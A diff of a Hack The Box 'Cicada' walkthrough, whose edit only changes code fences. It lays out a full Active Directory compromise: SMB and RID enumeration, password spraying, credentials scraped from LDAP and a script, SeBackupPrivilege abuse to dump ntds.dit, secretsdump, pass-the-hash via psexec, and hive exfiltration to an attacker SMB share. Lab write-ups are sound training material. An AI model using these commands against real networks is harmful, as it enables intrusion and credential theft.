@@ -2,7 +2,7 @@
 - 
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.35
 nmap -sU --top-ports=10 -vv 10.10.11.35
 
@@ -164,7 +164,7 @@ PORT     STATE         SERVICE      REASON
 
 ## SMB Enumeration
 - smbclient:
-	```bash
+	```
 smbclient -U '' -L //10.10.11.35 --password='' 
 
         Sharename       Type      Comment
@@ -181,7 +181,7 @@ do_connect: Connection to 10.10.11.35 failed (Error NT_STATUS_RESOURCE_NAME_NOT_
 Unable to connect with SMB1 -- no workgroup available
 ```
 - netexec/crackmapexec
-	```bash
+	```
 netexec smb 10.10.11.35 -u '' -p '' --shares  
 
 ---OUTPUT---
@@ -190,7 +190,7 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\:
 SMB         10.10.11.35     445    CICADA-DC        [-] Error enumerating shares: STATUS_ACCESS_DENIED
 ```
 	- Next Attempt
-		```bash
+		```
 netexec smb 10.10.11.35 -u 'guest' -p '' --shares  
 
 ---OUTPUT---
@@ -208,7 +208,7 @@ SMB         10.10.11.35     445    CICADA-DC        NETLOGON                    
 SMB         10.10.11.35     445    CICADA-DC        SYSVOL                          Logon server share 
 ```
 - Login to HR Share as guest
-	```bash
+	```
 smbclient -U 'guest' //10.10.11.35/HR --password='' 
 Try "help" to get a list of possible commands.
 smb: \> dir
@@ -222,7 +222,7 @@ smb: \> get "Notice from HR.txt"
                 4168447 blocks of size 4096. 481595 blocks available
 ```
 - We find a password, a username (support) and important notes:
-	```bash
+	```
 cat Notice\ from\ HR.txt                                           
 
 ---OUTPUT---
@@ -250,7 +250,7 @@ Best regards,
 Cicada Corp
 ```
 - I tried logging in with rpc client and checked if I could pass some commands. Most were denied but I could lookup SID's which would allow me to RID bruteforce:
-	```bash
+	```
 rpcclient 10.10.11.35 -U 'guest%'
 rpcclient $> enumdomusers
 rpcclient $> lookupnames administrator
@@ -271,7 +271,7 @@ S-1-5-21-917908876-1423158569-3159038727-1000 CICADA\CICADA-DC$ (1)
 
 ```
 - We use impackets-lookupsids to RID brute force:
-	```bash
+	```
 impacket-lookupsid guest@10.10.11.35 -no-pass
 
 ---OUTPUT---
@@ -314,7 +314,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 1601: CICADA\emily.oscars (SidTypeUser)
 ```
 - We then clean it a bit to grab just the users and save it to a file:
-	```bash
+	```
 impacket-lookupsid guest@10.10.11.35 -no-pass | grep "SidTypeUser"
 impacket-lookupsid guest@10.10.11.35 -no-pass | grep "SidTypeUser" > userlist
 ---OUTPUT---
@@ -329,7 +329,7 @@ impacket-lookupsid guest@10.10.11.35 -no-pass | grep "SidTypeUser" > userlist
 1601: CICADA\emily.oscars (SidTypeUser)
 ```
 - We do a bit more cleaning so it holds only the username:
-	```bash
+	```
 cat userlist| awk -F\\ '{print $2}' | awk  '{print $1}'
 cat userlist| awk -F\\ '{print $2}' | awk  '{print $1}' > fixedusrelist
 
@@ -347,7 +347,7 @@ emily.oscars
 
 ```
 - I also save another userlist with the domain.
-	```bash
+	```
 cat userlist| awk -F: '{print $2}' | awk  '{print $1}'
 cat userlist| awk -F: '{print $2}' | awk  '{print $1}' > fixeduserlist2
 
@@ -366,7 +366,7 @@ CICADA\emily.oscars
 -  Tried to find a way to check password lockout threshold but couldn't find. (tried enum4linux, crackmapexec/netexec, ldapsearch)
 - Attempted to use kerbrute to check pwds but fails
 - I then use cracmapexec to share to check and get a hit:
-	```bash
+	```
 crackmapexec smb 10.10.11.35 -u fixeduserlist -p 'Cicada$M6Corpb*@Lp#nZp!8'
 
 ---RELEVANT-OUTPUT---
@@ -375,7 +375,7 @@ SMB         10.10.11.35     445    CICADA-DC        [+] cicada.htb\michael.wrigh
 	- I check shares and no extra privileges so can't check DEV share.
 	- winrm doesn't give a hit
 - I login with rpcclient to check if any more privileges:
-	```bash
+	```
 rpcclient 10.10.11.35 -U 'michael.wrightson'
 Password for [WORKGROUP\michael.wrightson]:Cicada$M6Corpb*@Lp#nZp!8
 rpcclient $> enumdomusers
@@ -392,7 +392,7 @@ user:[emily.oscars] rid:[0x641]
 ```
 	- We have some extra privileges (as compared to guest)
 - We also grab files for bloodhound:
-	```bash
+	```
 bloodhound-python --dns-tcp -ns 10.10.11.35 -d cicada.htb -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' -c all
 ```
 	- We mark michael.wrightson as owned but don't see any path to exploit.
@@ -400,7 +400,7 @@ bloodhound-python --dns-tcp -ns 10.10.11.35 -d cicada.htb -u 'michael.wrightson'
 	- See Emily Oscars user.
 		- No path seen from user
 - We try ldapsearch (initially tried without credentials and failed so anonymous auth doesn't work)
-	```bash
+	```
 ldapsearch -H ldap://10.10.11.35 -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" | grep "password"
 --
 ldapsearch -H ldap://10.10.11.35 -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b "DC=cicada,DC=htb" | grep "my password" -A10 -B10
@@ -435,7 +435,7 @@ objectGUID:: vLT9wKgMqkOmSQuC/2CSVw==
 	- We get new credentials: `david.orelious`:`aRt$Lp#7t*VQ!3`
 	- **ALTERNATE METHOD**
 		- We can use crackmapexec/netexec to find the password using the following command (from Ippsec)
-			```bash
+			```
 netexec smb 10.10.11.35 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
 
 
@@ -445,7 +445,7 @@ SMB         10.10.11.35     445    CICADA-DC        david.orelious              
 			- `--users` enumerates all users in AD.
 				- Also shows last pwd set time, bad password, descriptions etc which is how we got the pwd (description of david)
 - We check with crackmapexec smb(fails for winrm)
-	```bash
+	```
 crackmapexec smb 10.10.11.35 -u 'david.orelious' -p 'aRt$Lp#7t*VQ!3' --shares
 
 ---OUTPUT---
@@ -464,7 +464,7 @@ SMB         10.10.11.35     445    CICADA-DC        SYSVOL          READ        
 ```
 	- We get a hit and we have higher permissions and can access DEV share
 - Accessing DEV share:
-	```bash
+	```
 smbclient -U 'cicada/david.orelious' //10.10.11.35/DEV --password='aRt$Lp#7t*VQ!3'
 
 smb: \> dir
@@ -482,7 +482,7 @@ smb: \> exit
 getting file \Backup_script.ps1 of size 601 as Backup_script.ps1 (2.2 KiloBytes/sec) (average 2.2 KiloBytes/sec)
 ```
 - We pass strings on Backup_script.ps1 (we can also `cat` it)
-	```bash
+	```
 strings Backup_script.ps1
 
 ---OUTPUT---
@@ -499,7 +499,7 @@ Write-Host "Backup completed successfully. Backup file saved to: $backupFilePath
 ```
 	- We get some credentials: `emily.oscars`:`Q!3@Lp#M6b*7t*Vt`
 - We check with crackmapexec
-	```bash
+	```
 netexec winrm 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt' 
 
 ---OUTPUT---
@@ -510,7 +510,7 @@ WINRM       10.10.11.35     5985   CICADA-DC        [+] cicada.htb\emily.oscars:
 ```
 	- We get a hit!
 - We login with these credentials via evil-winrm
-	```bash
+	```
 evil-winrm -u 'emily.oscars' -p 'Q!3@Lp#M6b*7t*Vt' -i 10.10.11.35
 
 ---OUTPUT---
@@ -529,7 +529,7 @@ cicada\emily.oscars
 	- Alternatively if we checked read/write privileges for smb for this user we would see we have read write access to C drive which we can then access with smb to grab the user flag located on Emily's Desktop directory there
 ## Privilege Escalation
 - We pass this command and find a vulnerable backup privilege:
-	```bash
+	```
 whoami /priv
 
 ---OUTPUT---
@@ -548,7 +548,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 - I fuse this link to exploit:
 	- https://github.com/k4sth4/SeBackupPrivilege
 - I download the modules and create the vss.dsh file
-	```bash
+	```
 cat vss.dsh
 
 ---OUTPUT---
@@ -568,7 +568,7 @@ upload SeBackupPrivilegeCmdLets.dll
 upload SeBackupPrivilegeUtils.dll
 ```
 - Then i pass the exploit commands improting the module and creating a shadow disk with diskshadow command:
-	```bash
+	```
 import-module .\SeBackupPrivilegeCmdLets.dll
 import-module .\SeBackupPrivilegeUtils.dll
 diskshadow /s vss.dsh
@@ -610,7 +610,7 @@ The shadow copy was successfully exposed as z:\.
 ```
 	- To check we can change to Z: directory to see if it exists
 - Then we grab the ntds.dit and SYSTEM hive and download it
-	```bash
+	```
 Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit c:\\temp\\ntds.dit
 --
 reg save HKLM\SYSTEM C:\\temp\\SYSTEM
@@ -624,7 +624,7 @@ download ntds.dit
 download SAM
 ```
 - Finally we attempt to crack it :
-	```bash
+	```
 impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 --OR--
 impacket-secretsdump -sam SAM -system SYSTEM LOCAL
@@ -687,7 +687,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 ```
 	- We get hashes of all users, more specifically the Administrator
 - We login with Admin credentials using Pass the Hash
-	```bash
+	```
 impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341 administrator@10.10.11.35
 
 --OR--
@@ -724,7 +724,7 @@ cicada\administrator
 	- We also see a krbtgt ticket and could possible try Golden Ticket to login also.
 ## Alternate method (robocopy)
 - We can use robocopy also to exploit SeBackupPrivilege to grab the root flag by backing up the Administrator Desktop folder
-	```bash
+	```
 mkdir C:\temp\robocopy
 cd robocopy
 robocopy /b C:\\users\\administrator\\desktop C:\\temp\\robocopy
@@ -743,7 +743,7 @@ Mode                 LastWriteTime         Length Name
 ## Alternate priv esc (unstable, may not always work)
 - Ippsec uses impacket-Reg command too the backup registry and it times out but if it collects enough data it may be able to crack the pwd
 	- Make smb server share:
-		```bash
+		```
 impacket-smbserver -smb2support share $(pwd)
 
 ---OUTPUT---
@@ -766,7 +766,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Remaining connections []
 ```
 - Backup SAM and SYSTEM files
-	```bash
+	```
 impacket-reg 'cicada.htb/emily.oscars:Q!3@Lp#M6b*7t*Vt'@10.10.11.35 backup -o //10.10.14.25/share
 
 ---OUTPUT---
@@ -794,7 +794,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Saved HKLM\SECURITY to //10.10.14.25/share\SECURITY.save
 ```
 - We crack the files (don't really require Security file i think but we use it):
-	```bash
+	```
 impacket-secretsdump -sam SAM.save -system SYSTEM.save -security SECURITY.save LOCAL
 
 ---OUTPUT---
